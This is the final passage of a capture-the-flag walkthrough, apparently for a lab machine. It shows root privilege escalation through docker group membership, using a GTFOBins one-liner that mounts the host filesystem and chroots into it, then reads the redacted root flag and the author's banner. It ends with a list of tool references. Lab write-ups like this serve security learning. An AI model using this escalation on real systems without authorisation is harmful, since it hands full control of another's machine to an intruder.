anurodh@ip-10-67-160-117:~$ 
```

But nothing new there.

But the `anurodh` user is a member of the `docker` group

```bash
anurodh@ip-10-67-160-117:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
anurodh@ip-10-67-160-117:~$ 
```

Which can be used to get a root shell according to [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell)

```bash
anurodh@ip-10-67-160-117:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# 
```

### Get the Root Flag

Finally, we can get the root flag

```bash
# cd /root
# ls
proof.txt  snap
# cat proof.txt


                                        {ROOT-FLAG: <redacted>}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a



# 
```

Answer: `{ROOT-FLAG: <redacted>}`

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [Docker - GTFOBins](https://gtfobins.github.io/gtfobins/docker/)
- [Docker (software) - Wikipedia](https://en.wikipedia.org/wiki/Docker_(software))
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [ftp - Linux manual page](https://linux.die.net/man/1/ftp)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [PHP - Wikipedia](https://en.wikipedia.org/wiki/PHP)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [Steganography - Wikipedia](https://en.wikipedia.org/wiki/Steganography)
- [steghide - Homepage](https://steghide.sourceforge.net/)
- [steghide - Kali Tools](https://www.kali.org/tools/steghide/)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [unzip - Linux manual page](https://linux.die.net/man/1/unzip)
- [vsftpd - Wikipedia](https://en.wikipedia.org/wiki/Vsftpd)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
